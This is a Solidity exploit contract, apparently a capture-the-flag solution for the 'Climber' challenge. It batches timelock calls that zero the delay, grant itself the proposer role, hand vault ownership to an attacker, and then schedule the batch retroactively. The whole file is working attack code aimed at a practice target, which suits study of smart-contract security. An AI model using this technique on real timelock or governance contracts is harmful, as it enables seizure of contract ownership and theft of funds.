// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./ClimberTimelock.sol";
import "./ClimberVault.sol";

interface IClimberTimelock {
    function execute(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external payable;

    function schedule(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external;
}

contract AttackClimber is ClimberVault {
    address[] private targets;
    uint256[] private values;
    bytes[] private dataElements;
    IClimberTimelock private timeLock;
    address private vault;
    address private attacker;

    constructor(
        address _vault,
        address _timeLock,
        address _attackerAddress
    ) {
        vault = _vault;
        timeLock = IClimberTimelock(_timeLock);
        attacker = _attackerAddress;
    }

    // timelock.schedule has to be executed through a proxy (this contract) because the dataElements hashing will never match
    // First I tried to call the schedule function directly but the dataElements passed to schedule was not matching the
    // one passed to execute
    function schedule() public{
        timeLock.schedule(targets, values, dataElements, keccak256("HUAT"));
    }

    function attack() public {
        // update delay to 0 to execute tasks instantly
        targets.push(address(timeLock));
        values.push(0);
        dataElements.push(abi.encodeWithSignature("updateDelay(uint64)", uint64(0)));

        //grant this contract the proposal role to schedule tasks
        targets.push(address(timeLock));
        values.push(0);
        bytes32 PROPOSER_ROLE = keccak256("PROPOSER_ROLE");
        dataElements.push(abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this)));

        // transfer ownership to the attacker
        targets.push(address(vault));
        values.push(0);
        dataElements.push(abi.encodeWithSignature("transferOwnership(address)", attacker));

        // schedule the task through this contract
        targets.push(address(this));
        values.push(0);
        dataElements.push(
            abi.encodeWithSignature("schedule()")
        );

        timeLock.execute(targets, values, dataElements, keccak256("HUAT"));
    }
}
